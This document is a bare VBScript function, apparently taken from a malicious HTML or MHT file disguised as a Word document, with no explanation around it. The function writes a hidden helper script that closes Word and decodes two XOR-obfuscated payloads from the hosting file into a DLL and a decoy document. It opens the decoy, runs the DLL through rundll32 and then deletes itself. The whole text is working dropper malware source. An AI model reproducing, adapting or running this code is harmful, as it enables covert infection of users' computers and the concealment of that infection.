function runshell()
  On Error Resume Next
  set objshell= Createobject("WScript.Shell")
  strValue = objshell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Local AppData")
  ename = "rundll32"","""""""&strValue&"\mm.dll"""",Setting"
  outfile1= strValue&"\mm.dll"
  bs = strValue&"\ss.vbs"
  dn= strValue&"\t.doc"
  v=window.location.href
  v=Replace(v,"file:///","",1,1,1)
  v=Replace(v,"?.html","",1,1,1)
  v=Replace(v,"%20"," ",1)
  v=Replace(v,"/","\",1)            
  cmd = "cmd"
  arg=" /c taskkill  -f -im winword.exe "
  arg1= ""","""
  set shell=createobject("wscript.shell") 
  shell.run "cmd.exe /c ""echo On Error Resume Next >"""&bs&"""  "" ",0,true  
  shell.run "cmd.exe /c ""echo set shell=createobject(""Shell.Application"") >>"""&bs&"""    "" ",0,true
  shell.run "cmd.exe /c ""echo shell.ShellExecute ""cmd"","""&arg&""","""","""",0 >>"""&bs&"""        "" ",0,true
  shell.run "cmd.exe /c ""echo wscript.sleep 3000             >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo dim str                                                                      >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo dim L1                                                                       >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo dim L2                                                                       >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo dim Len                                                                      >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo dim infile                                                                   >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo dim outfile1                                                                 >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo dim outfile2                                                                 >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo infile = """&v&"""                                                             >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo outfile1 = """&outfile1&"""                                                           >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo outfile2 = """&dn&"""                                                           >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo L1=     78924                                                                      >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo L2=     38912                                                                   >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo size=    144893                                                                 >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo offset1 = size-L1-L2                                                         >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo offset2 = size-L2                                                            >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo Len=0                                                                        >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo str = ReadBinary (infile,L1,offset1)                                         >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo WriteBinary outfile1, str                                                    >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo str = ReadBinary (infile,L2,offset2)                                         >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo WriteBinary outfile2, str                                                    >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo Function ReadBinary(FileName,length,offset)                                  >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   Dim Buf(), I                                                               >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   With CreateObject(""ADODB.Stream"")                                        >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo     .Mode = 3: .Type = 1: .Open: .LoadFromFile FileName : .Position = offset >> """&bs&"""  "" ",0,true 
  shell.run "cmd.exe /c ""echo     Len =length -1                                                           >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo     ReDim Buf(Len)                                                           >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo     For I = 0 To Len: if(I=0)  then Buf(I)=(AscB(.Read(1))) else if ((I mod 2)=0) then Buf(I)=(AscB(.Read(1)) xor AscB(chr(65))) else Buf(I)=(AscB(.Read(1)) xor AscB(chr(67))) end if        >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo     Next                      >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo     .Close                                                                   >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   End With                                                                   >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   ReadBinary = Buf                                                           >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo End Function                                                                 >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo Sub WriteBinary(FileName, Buf)                                               >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   Dim I, aBuf, Size, bStream                                                 >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   Size = UBound(Buf): ReDim aBuf(Size \ 2)                                   >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   For I = 0 To Size - 1 Step 2                                               >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo       aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))                          >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   Next                                                                       >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))                                >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   aBuf=Join(aBuf, """")                                                      >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   Set bStream = CreateObject(""ADODB.Stream"")                               >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   bStream.Type = 1: bStream.Open                                             >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   With CreateObject(""ADODB.Stream"")                                        >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo     .Type = 2 : .Open: .WriteText aBuf                                       >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo     .Position = 2: .CopyTo bStream: .Close                                   >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   End With                                                                   >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   bStream.SaveToFile FileName, 2: bStream.Close                              >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo   Set bStream = Nothing                                                      >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo End Sub                                                                      >> """&bs&"""  "" ",0,true
  shell.run "cmd.exe /c ""echo set shell=createobject(""Shell.Application"") >>"""&bs&"""    "" ",0,true
  shell.run "cmd.exe /c ""echo shell.ShellExecute """&dn&""" >>"""&bs&"""               "" ",0,true
  shell.run "cmd.exe /c ""echo shell.ShellExecute """&ename&""" >>"""&bs&"""               "" ",0,true
  shell.run "cmd.exe /c ""echo Set xa = CreateObject(""Scripting.FileSystemObject"") >>"""&bs&"""                      "" ",0,true
  shell.run "cmd.exe /c ""echo If xa.FileExists("""&bs&""") Then                     >>"""&bs&"""                      "" ",0,true
  shell.run "cmd.exe /c ""echo Set xb = xa.GetFile("""&bs&""")                       >>"""&bs&"""                      "" ",0,true
  shell.run "cmd.exe /c ""echo xb.Delete                                             >>"""&bs&"""                      "" ",0,true
  shell.run "cmd.exe /c ""echo End If                                                >>"""&bs&"""                      "" ",0,true
  shell.run "cmd.exe /c """&bs&"""   ",0,true
end function
